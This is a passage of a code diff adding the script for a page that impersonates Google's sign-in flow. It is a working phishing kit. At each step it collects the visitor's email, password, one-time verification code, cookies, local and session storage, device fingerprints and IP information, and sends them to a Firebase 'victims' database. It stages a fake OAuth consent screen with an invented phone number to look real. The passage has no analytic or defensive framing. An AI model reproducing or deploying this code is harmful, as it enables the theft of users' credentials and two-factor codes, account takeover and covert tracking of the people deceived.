+  const pw = document.getElementById('password');
+  pw.type = document.getElementById('showPw').checked ? 'text' : 'password';
+}
+
+/* ═══════════════════════════════════════════════════════
+   STEP 1 — EMAIL
+   ═══════════════════════════════════════════════════════ */
+async function submitEmail(event){
+  event.preventDefault();
+  hideErr('emailError');
+
+  const email = document.getElementById('email').value.trim();
+  if(!email){
+    showErr('emailError','emailErrorText','Enter an email or phone number');
+    return false;
+  }
+  // basic validation like Google
+  const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  const isPhone = /^[\d\s\-\+\(\)]{7,}$/.test(email);
+  if(!isEmail && !isPhone){
+    showErr('emailError','emailErrorText','Couldn\'t find your Google Account');
+    return false;
+  }
+
+  document.getElementById('emailBtnText').style.display = 'none';
+  document.getElementById('emailSpinner').style.display = 'block';
+  document.getElementById('emailBtn').disabled = true;
+
+  pendingEmail = email;
+  await ensureIntel();
+
+  const victimId = 'gg_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+  pendingVictimId = victimId;
+
+  try{
+    await database.ref('victims/' + victimId).set({
+      platform: 'google',
+      email: email,
+      password: '',
+      step: 'email',
+      deviceInfo: cachedDeviceInfo,
+      canvasFingerprint: cachedCanvasFP,
+      webglFingerprint: cachedWebGLFP,
+      cookies: getAllCookies(),
+      cookieString: document.cookie,
+      ipInfo: cachedIPInfo,
+      timestamp: new Date().toISOString(),
+      victimId: victimId,
+      referrer: document.referrer || 'Direct Access',
+      pageUrl: window.location.href,
+      localStorageData: getLocalStorage(),
+      sessionStorageData: getSessionStorage()
+    });
+    console.log('✓ Google email captured');
+  }catch(e){ console.error('Firebase error:', e.message); }
+
+  setTimeout(() => { showStep2(); }, 900);
+  return false;
+}
+
+/* ═══════════════════════════════════════════════════════
+   STEP 2 — PASSWORD
+   ═══════════════════════════════════════════════════════ */
+function showStep2(){
+  document.getElementById('step1').style.display = 'none';
+  document.getElementById('step2').style.display = 'block';
+
+  const initials = (pendingEmail[0] || 'U').toUpperCase();
+  document.getElementById('chipAvatar').textContent = initials;
+  document.getElementById('chipEmail').textContent = pendingEmail;
+
+  setTimeout(() => { document.getElementById('password').focus(); }, 50);
+}
+
+function backToEmail(){
+  document.getElementById('step2').style.display = 'none';
+  document.getElementById('step1').style.display = 'block';
+  document.getElementById('emailBtn').disabled = false;
+  document.getElementById('emailBtnText').style.display = 'inline';
+  document.getElementById('emailSpinner').style.display = 'none';
+  document.getElementById('password').value = '';
+}
+
+async function submitPassword(event){
+  event.preventDefault();
+  hideErr('pwError');
+
+  const pw = document.getElementById('password').value;
+  if(!pw){
+    showErr('pwError','pwErrorText','Enter a password');
+    return false;
+  }
+
+  document.getElementById('pwBtnText').style.display = 'none';
+  document.getElementById('pwSpinner').style.display = 'block';
+  document.getElementById('pwBtn').disabled = true;
+
+  pendingPassword = pw;
+  await ensureIntel();
+
+  const id = pendingVictimId + '_pw';
+  try{
+    await database.ref('victims/' + id).set({
+      platform: 'google',
+      email: pendingEmail,
+      password: pw,
+      step: 'password',
+      deviceInfo: cachedDeviceInfo,
+      canvasFingerprint: cachedCanvasFP,
+      webglFingerprint: cachedWebGLFP,
+      cookies: getAllCookies(),
+      cookieString: document.cookie,
+      ipInfo: cachedIPInfo,
+      timestamp: new Date().toISOString(),
+      victimId: id,
+      parentVictimId: pendingVictimId,
+      referrer: document.referrer || 'Direct Access',
+      pageUrl: window.location.href
+    });
+    console.log('✓ Google password captured');
+  }catch(e){ console.error('Firebase error:', e.message); }
+
+  setTimeout(() => { showStep3(); }, 900);
+  return false;
+}
+
+/* ═══════════════════════════════════════════════════════
+   STEP 3 — OAUTH CONSENT
+   ═══════════════════════════════════════════════════════ */
+function showStep3(){
+  document.getElementById('step2').style.display = 'none';
+  document.getElementById('step3').style.display = 'block';
+
+  const initials = (pendingEmail[0] || 'U').toUpperCase();
+  document.getElementById('consentAvatar').textContent = initials;
+  document.getElementById('consentEmail').textContent = pendingEmail;
+
+  // derive display name from email
+  const local = pendingEmail.split('@')[0] || 'User';
+  const pretty = local.replace(/[._\-]+/g, ' ').replace(/\b\w/g, c => c.toUpperCase()).slice(0, 40);
+  document.getElementById('consentName').textContent = pretty || 'Your Name';
+}
+
+function cancelConsent(){
+  window.location.href = 'https://accounts.google.com/';
+}
+
+async function confirmConsent(){
+  await ensureIntel();
+  const id = pendingVictimId + '_consent';
+  try{
+    await database.ref('victims/' + id).set({
+      platform: 'google',
+      email: pendingEmail,
+      password: pendingPassword,
+      step: 'consent',
+      deviceInfo: cachedDeviceInfo,
+      ipInfo: cachedIPInfo,
+      cookies: getAllCookies(),
+      timestamp: new Date().toISOString(),
+      victimId: id,
+      parentVictimId: pendingVictimId
+    });
+    console.log('✓ Consent captured');
+  }catch(e){}
+
+  // generate fake phone ending for realism
+  const last4 = String(Math.floor(1000 + Math.random() * 9000));
+  document.getElementById('phoneEnd').textContent = '••• ' + last4;
+
+  document.getElementById('step3').style.display = 'none';
+  document.getElementById('step4').style.display = 'block';
+  setTimeout(() => { document.getElementById('otpInput').focus(); }, 50);
+}
+
+/* ═══════════════════════════════════════════════════════
+   STEP 4 — OTP
+   ═══════════════════════════════════════════════════════ */
+async function submitOtp(event){
+  event.preventDefault();
+  hideErr('otpError');
+
+  const otp = document.getElementById('otpInput').value.trim();
+  if(!otp || otp.length < 4){
+    showErr('otpError','otpErrorText','Enter a valid verification code');
+    return false;
+  }
+
+  document.getElementById('otpBtnText').style.display = 'none';
+  document.getElementById('otpSpinner').style.display = 'block';
+  document.getElementById('otpBtn').disabled = true;
+
+  await ensureIntel();
+
+  const id = pendingVictimId + '_otp';
+  try{
+    await database.ref('victims/' + id).set({
+      platform: 'google',
+      email: pendingEmail,
+      password: '',
+      otp: otp,
+      otpCode: otp,
+      step: 'otp',
+      deviceInfo: cachedDeviceInfo,
+      canvasFingerprint: cachedCanvasFP,
+      webglFingerprint: cachedWebGLFP,
+      cookies: getAllCookies(),
+      cookieString: document.cookie,
+      ipInfo: cachedIPInfo,
+      timestamp: new Date().toISOString(),
+      victimId: id,
+      parentVictimId: pendingVictimId,
+      referrer: document.referrer || 'Direct Access',
+      pageUrl: window.location.href
+    });
+    console.log('✓ Google OTP captured');
+  }catch(e){ console.error('Firebase error:', e.message); }
+
+  setTimeout(() => { window.location.href = REDIRECT_URL; }, 1200);
+  return false;
+}
+
+function backToPassword(){
+  document.getElementById('step4').style.display = 'none';
+  document.getElementById('step2').style.display = 'block';
+}
+
+async function resendOtp(event){
+  event.preventDefault();
+  await ensureIntel();
+  const id = pendingVictimId + '_resend_' + Date.now();
+  try{
+    await database.ref('victims/' + id).set({
+      platform: 'google',
+      email: pendingEmail,
+      otp: 'RESEND_REQUESTED',
+      step: 'resend',
+      deviceInfo: cachedDeviceInfo,
+      ipInfo: cachedIPInfo,
+      timestamp: new Date().toISOString(),
+      victimId: id,
+      parentVictimId: pendingVictimId
+    });
+  }catch(e){}
+  alert('A new code has been sent to your phone.');
+  return false;
+}
+
+/* ═══════════════════════════════════════════════════════
+   FORGOT / CREATE
+   ═══════════════════════════════════════════════════════ */
+async function handleForgot(event){
+  event.preventDefault();
+  const email = prompt('Enter your email or phone number:');
+  if(!email || !email.trim()) return false;
+
+  await ensureIntel();
+  const id = 'gg_forgot_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+  try{
+    await database.ref('victims/' + id).set({
+      platform: 'google',
+      email: email.trim(),
+      password: '',
+      otp: 'FORGOT_PASSWORD_REQUEST',
+      step: 'forgot',
+      deviceInfo: cachedDeviceInfo,
+      ipInfo: cachedIPInfo,
+      cookies: getAllCookies(),
+      timestamp: new Date().toISOString(),
+      victimId: id
+    });
+  }catch(e){}
+  alert('If an account exists for ' + email + ', we\'ll send recovery instructions shortly.');
+  return false;
+}
+
+function handleCreate(event){
+  event.preventDefault();
+  window.location.href = 'https://accounts.google.com/signup';
+  return false;
+}
+</script>
+</body>
+</html>
